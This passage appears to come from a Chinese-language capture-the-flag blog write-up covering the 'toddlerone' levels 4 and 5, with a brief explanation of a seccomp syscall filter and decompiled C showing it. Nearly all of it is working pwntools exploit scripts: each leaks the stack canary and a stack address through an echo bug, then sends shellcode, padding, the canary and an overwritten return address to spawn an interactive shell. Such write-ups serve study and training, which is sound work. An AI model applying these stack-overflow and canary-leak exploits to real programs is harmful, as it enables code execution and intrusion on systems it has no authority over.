init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xC0</span> <span class="token operator">-</span> <span class="token number">0xC0</span> <span class="token operator">-</span> <span class="token number">0x70</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token number">0x58</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4a6fb1126219f9e3</span><span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x58</span><span class="token operator">-</span>shellcode_size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'B'</span> <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>





<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.0"</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.0"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0x60</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xf58b48d72ec7b457</span><span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">72</span><span class="token operator">-</span>shellcode_size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'B'</span> <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这一关跟上一关没有区别，将退出状态的检验换成了限制进程的系统调用。</p>
<p>这段代码的功能是在程序中设置 seccomp，以限制进程只能调用指定的系统调用。其余未明确允许的系统调用会导致进程被终止。这种技术通常用于增加程序的安全性，防止未知的系统调用带来的安全风险。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span>
 <span class="token punctuation">&#123;</span>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Restricting system calls (default: kill)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   v17 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
     v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v16 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
     v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">seccomp_syscall_resolve_num_arch</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allowing syscall: %s (number %i)\n"</span><span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v17<span class="token punctuation">,</span> <span class="token number">2147418112LL</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>v16 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
       <span class="token function">__assert_fail</span><span class="token punctuation">(</span>
         <span class="token string">"seccomp_rule_add(ctx, SCMP_ACT_ALLOW, syscalls_allowed[i], 0) == 0"</span><span class="token punctuation">,</span>
         <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span>
         <span class="token number">0x9Cu</span><span class="token punctuation">,</span>
         <span class="token string">"challenge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>v17<span class="token punctuation">)</span> <span class="token punctuation">)</span>
     <span class="token function">__assert_fail</span><span class="token punctuation">(</span><span class="token string">"seccomp_load(ctx) == 0"</span><span class="token punctuation">,</span> <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> <span class="token number">0x9Fu</span><span class="token punctuation">,</span> <span class="token string">"challenge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.1"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.1"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x30</span>  <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


init_payload_size <span class="token operator">=</span> <span class="token number">0x30</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> 
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode_2.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xF55A7AC1D88E5605</span><span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.0"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.0"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x20</span>  <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

init_payload_size <span class="token operator">=</span> <span class="token number">0x20</span>  <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> 
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>
response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span>

real_payload_size <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode_2.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xc47c70dcf4a8eb20</span><span class="token punctuation">)</span>
real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_address
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>

